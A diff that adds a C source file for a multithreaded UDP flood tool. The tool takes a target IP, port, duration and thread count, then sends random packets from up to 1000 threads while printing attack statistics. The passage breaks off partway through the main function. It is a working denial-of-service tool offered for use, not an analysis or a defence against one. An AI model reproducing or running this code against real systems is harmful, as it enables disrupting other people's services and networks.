@@ -1,0 +1,129 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/socket.h>
+#include <arpa/inet.h>
+#include <pthread.h>
+#include <unistd.h>
+#include <errno.h>
+#include <time.h>
+
+#define PAYLOAD_SIZE 20
+#define MAX_THREADS 1000
+#define UPDATE_INTERVAL 1
+
+typedef struct {
+    char *ip;
+    int port;
+    int duration;
+    int packets_sent;
+    int thread_id;
+} thread_args;
+
+int running_threads = 0;
+int total_packets = 0;
+time_t program_start;
+
+void generate_payload(char *buffer, size_t size) {
+    const char hex_chars[] = "0123456789abcdef";
+    for (size_t i = 0; i < size; i++) {
+        buffer[i * 4] = '\\';
+        buffer[i * 4 + 1] = 'x';
+        buffer[i * 4 + 2] = hex_chars[rand() % 16];
+        buffer[i * 4 + 3] = hex_chars[rand() % 16];
+    }
+    buffer[size * 4] = '\0';
+}
+
+void print_stats() {
+    time_t now = time(NULL);
+    int elapsed = (int)difftime(now, program_start);
+    printf("\r\x1b[36m[STATS]\x1b[0m Time: %ds | Packets: %d | PPS: %d",
+           elapsed, total_packets, total_packets/(elapsed ? elapsed : 1));
+    fflush(stdout);
+}
+
+void *udp_attack(void *args) {
+    thread_args *params = (thread_args *)args;
+    struct sockaddr_in server_addr;
+    int sock;
+    char buffer[PAYLOAD_SIZE * 4 + 1];
+    
+    time_t last_update = time(NULL);
+    time_t start_time = time(NULL);
+    
+    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
+        fprintf(stderr, "[Thread %d] Socket error: %s\n", 
+                params->thread_id, strerror(errno));
+        running_threads--;
+        pthread_exit(NULL);
+    }
+
+    server_addr.sin_family = AF_INET;
+    server_addr.sin_port = htons(params->port);
+    
+    if (inet_pton(AF_INET, params->ip, &server_addr.sin_addr) <= 0) {
+        fprintf(stderr, "[Thread %d] Invalid IP: %s\n", 
+                params->thread_id, params->ip);
+        close(sock);
+        running_threads--;
+        pthread_exit(NULL);
+    }
+
+    while (time(NULL) - start_time < params->duration) {
+        generate_payload(buffer, PAYLOAD_SIZE);
+        
+        if (sendto(sock, buffer, strlen(buffer), 0, 
+                  (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
+            fprintf(stderr, "[Thread %d] Send error: %s\n", 
+                    params->thread_id, strerror(errno));
+            continue;
+        }
+        
+        params->packets_sent++;
+        total_packets++;
+        
+        if (time(NULL) - last_update >= UPDATE_INTERVAL) {
+            print_stats();
+            last_update = time(NULL);
+        }
+    }
+
+    close(sock);
+    running_threads--;
+    pthread_exit(NULL);
+}
+
+int main(int argc, char *argv[]) {
+    if (argc != 5) {
+        printf("Usage: %s <ip> <port> <duration> <threads>\n", argv[0]);
+        printf("Example: %s 192.168.1.100 80 60 10\n");
+        return 1;
+    }
+
+    char *target_ip = argv[1];
+    int target_port = atoi(argv[2]);
+    int attack_duration = atoi(argv[3]);
+    int thread_count = atoi(argv[4]);
+    
+    if (thread_count <= 0 || thread_count > MAX_THREADS) {
+        fprintf(stderr, "Invalid thread count (1-%d)\n", MAX_THREADS);
+        return 1;
+    }
+
+    printf("\x1b[31m[ATTACK STARTED]\x1b[0m\n");
+    printf("Target: %s:%d\n", target_ip, target_port);
+    printf("Duration: %d seconds\n", attack_duration);
+    printf("Threads: %d\n", thread_count);
+    
+    srand(time(NULL));
+    program_start = time(NULL);
+    running_threads = thread_count;
+    thread_args *thread_params = malloc(thread_count * sizeof(thread_args));
+    pthread_t *threads = malloc(thread_count * sizeof(pthread_t));
+
+    for (int i = 0; i < thread_count; i++) {
+        thread_params[i].ip = target_ip;
+        thread_params[i].port = target_port;
+        thread_params[i].duration = attack_duration;
+       
